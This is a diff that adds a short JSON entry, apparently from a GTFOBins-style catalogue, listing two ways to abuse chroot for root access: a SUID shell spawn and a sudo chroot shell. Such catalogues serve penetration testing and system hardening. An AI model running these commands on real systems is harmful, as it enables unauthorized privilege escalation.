@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "suid": [
+      {
+        "code": "./chroot / /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo chroot /\n"
+      }
+    ]
+  }
+}
